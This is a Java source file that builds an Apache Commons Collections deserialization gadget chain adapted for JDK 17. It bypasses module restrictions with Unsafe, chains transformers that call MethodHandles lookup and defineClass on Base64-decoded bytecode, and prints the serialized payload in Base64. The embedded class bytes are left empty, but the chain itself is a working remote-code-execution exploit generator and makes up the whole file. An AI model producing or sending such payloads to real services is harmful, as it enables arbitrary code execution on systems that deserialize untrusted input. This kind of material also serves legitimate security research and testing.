package gadget.jdk17;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.ReflectionUtils;
import util.SerializerUtils;
import util.UnsafeUtil;

import java.lang.invoke.MethodHandles;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
public class CC {
    public static void main(String[] args) throws Exception {
        UnsafeUtil.patchModule(CC.class);
        UnsafeUtil.patchModule(ReflectionUtils.class);
        String s = "";
        byte[] data = Base64.getDecoder().decode(s);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(MethodHandles.class),
                new InvokerTransformer("getDeclaredMethod", new
                        Class[]{String.class, Class[].class}, new Object[]{"lookup", new
                        Class[0]}),
                new InvokerTransformer("invoke", new Class[]
                        {Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]
                        {byte[].class}, new Object[]{data}),
                new InstantiateTransformer(new Class[0], new
                        Object[0]),
                new ConstantTransformer(1)
        };
        Transformer transformerChain = new ChainedTransformer(new
                Transformer[]{new ConstantTransformer(1)});
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        innerMap.remove("keykey");
        ReflectionUtils.setFieldValue(transformerChain, "iTransformers", transformers);
        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(expMap)));
    }
}
